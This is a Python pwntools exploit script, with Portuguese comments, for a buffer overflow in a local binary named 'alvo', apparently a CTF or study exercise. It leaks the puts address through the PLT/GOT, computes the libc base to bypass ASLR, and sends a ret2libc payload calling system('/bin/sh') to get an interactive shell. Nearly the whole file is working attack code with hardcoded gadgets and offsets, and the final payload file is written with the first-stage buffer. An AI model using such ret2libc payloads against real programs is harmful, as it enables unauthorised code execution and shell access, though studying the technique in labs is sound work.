#!/usr/bin/env python2

#
#
### [ANOTACOES] ###
## [LEAK REAL ADDRESS FROM PUTS] ##
# A PLT se voce der um disas em uma funcao @plt vc vera que por conta do lazy binding ela ainda nn foi resolvida, ela tem um jmp para a GOT
# Quando a funcao for chamada pela primeira vez ela sera resolvida pelo linker(ela so eh resolvida qnd for usada por conta do lazy binding) e ser armazenado na .got.plt
# A GOT armazena os enderecos guardados na .got.plt
# Precisamos vazar o endereco da puts para fazermos o calculo dos enderecos da libc ja que eles sao randomizados por conta do ASLR
# Mas como vazamos o endereco da puts@got:
# Nao precisamos chamar a puts para ser resolvida pq provavelmente ela ja foi (nesse exemplo ela ja foi usada e resolvida)
# Entao passados para o puts@plt imprimir a puts@got que eh justamente o endereco efetivo da puts
# Com esse endereco em maos podemos subtrair com o offset da puts da libc para chegar no endereco base da libc
# Com o endereco base podemos somar com os offsets que queremos, assim obtendo o endereco completo da funcao
# Perceba: apenas o endereco base da libc eh randomizado para ser usado, os offsets das funcoes da libc nao

## [EXPLOIT] ##
# Com o endereco da puts em maos voltamos para a main
# Pegamos o endereco do offset da puts e subtraimos com o endereco obtido e assim pegaremos o endereco base da libc
# Pegamos o offset de /bin/sh e de system
# Somaremos esses offsets com o endereco base da libc
# Finalizamos com a nossa querida shell e deixamos o ASLR no chinelo
#

from pwn import *

### [STAGE 0] - PREPARATION BINARY ###
context(arch = 'amd64', os = 'linux', endian = 'little')

#context.log_level = 'DEBUG'

binary = ELF('alvo')
p = process('./alvo')

### [STAGE 1] - LEAK REAL ADDRESS FROM PUTS ###

p.recvline()
print ''
log.info('Leaking puts address')

pop_rdi = 0x4011e3 	# Gadget: pop rdi ; ret
got_puts = 0x404018	# puts@got
plt_puts = 0x401030	# puts@plt
sym_main = binary.symbols['main']

buf = flat(
	b'A' * 88,
	pop_rdi,
	got_puts,
	plt_puts,
	sym_main
)

log.info('Saving Payload in: payload')

with open('payload', 'w') as file:
	file.write(buf)

p.sendline(buf)

leaked = p.recvline()
formatted = leaked[:8].strip().ljust(8, '\x00')
desc = u64(formatted)
addr = hex(desc)
puts_addr = int(addr, 16)

log.success('Addres PLT@GOT: '+addr)
print ''

### [STAGE 2] - EXPLOIT ###

log.info('Calculating Address...')
offset_puts = 0x76ab0
offset_shell = 0x18bb62
offset_system = 0x49de0

libc_base_addr = puts_addr - offset_puts

system_addr = libc_base_addr + offset_system
shell = libc_base_addr + offset_shell

payload = flat(
	b'A' * 88,
	pop_rdi,
	shell,
	system_addr
)

log.info('Saving Final Payload in: final_payload')
with open('final_payload', 'w') as file:
	file.write(buf)

log.info('Sending Payload...')
p.sendline(payload)
p.interactive()
